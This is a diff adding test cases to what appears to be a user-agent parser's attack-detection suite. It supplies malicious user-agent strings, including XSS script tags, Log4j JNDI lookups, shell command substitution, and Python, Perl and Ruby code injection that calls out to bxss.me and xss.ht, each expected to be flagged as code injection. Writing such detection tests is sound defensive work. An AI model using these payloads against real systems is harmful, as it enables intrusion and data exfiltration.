@@ -771,6 +771,78 @@ config:
       user_agent_string: '"\""><script src=https://include.xss.ht></script>"'
     expected: *isCodeInjection
 
+- test:
+    input:
+      user_agent_string: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4158.0 Safari/537.36 ";tenable_wasscan_xss_in_element_event=87bf67f4-ff97-4c1e-bad7-67d965e1814c//'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4158.0 Safari/537.36 script:";tenable_wasscan_xss_in_element_event=87bf67f4-ff97-4c1e-bad7-67d965e1814c//'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'';alert(/XSS/);//'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: 'Mozilla/5.0 (X11; Linux x86_64) ResponsibleDisclosure-AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36%22%3E%3Cscript%20src=https://blindbounty.xss.ht%3E%3C/script%3E%3Cxxxxxxx%3E'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '''.gethostbyname(lc(''xxxx''.''xxxxx.bxss.me.'')).''A''.chr(67).chr(hex(''58'')).chr(112).chr(66).chr(110).chr(71).'''
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '''+''A''.concat(70-3).concat(22*4).concat(117).concat(68).concat(117).concat(80)+(require''socket'' Socket.gethostbyname(''xxxx''+''xxxxx.bxss.me.'')[3].to_s)+'''
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/dns.log4j.xxxxx${::-.}1${::-.}bxss.me}}'
+    expected: *isCodeInjection
+
+- test:
+    input:
+      user_agent_string: '$(nslookup hitogredxqaas0b70d.bxss.me||perl -e "gethostbyname(''xxxxxx.bxss.me'')")'
+    expected: *isCodeInjection
+
+
+- test:
+    input:
+      user_agent_string: '''+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("xxxxx."+"bxss.me")+'''
+    expected:
+      DeviceClass                          : 'Hacker'
+      DeviceName                           : 'Hacker'
+      DeviceBrand                          : 'Hacker'
+      DeviceVersion                        : 'Hacker'
+      OperatingSystemClass                 : 'Hacker'
+      OperatingSystemName                  : 'Hacker'
+      OperatingSystemVersion               : 'Hacker'
+      OperatingSystemVersionMajor          : 'Hacker'
+      OperatingSystemNameVersion           : 'Hacker'
+      OperatingSystemNameVersionMajor      : 'Hacker'
+      LayoutEngineClass                    : 'Hacker'
+      LayoutEngineName                     : 'Hacker'
+      LayoutEngineVersion                  : 'Hacker'
+      LayoutEngineVersionMajor             : 'Hacker'
+      LayoutEngineNameVersion              : 'Hacker'
+      LayoutEngineNameVersionMajor         : 'Hacker'
+      AgentClass                           : 'Hacker'
+      AgentName                            : 'Hacker'
+      AgentVersion                         : 'Hacker'
+      AgentVersionMajor                    : 'Hacker'
+      AgentNameVersion                     : 'Hacker'
+      AgentNameVersionMajor                : 'Hacker'
+      HackerAttackVector                   : 'Code Injection'
+      HackerToolkit                        : 'Unknown'
+      AgentInformationUrl                  : 'bxss.me'
+
+
 # Validate false positive edge case that matched the substring "OR NOT" in "honOR NOTe 8"
 - test:
     input:
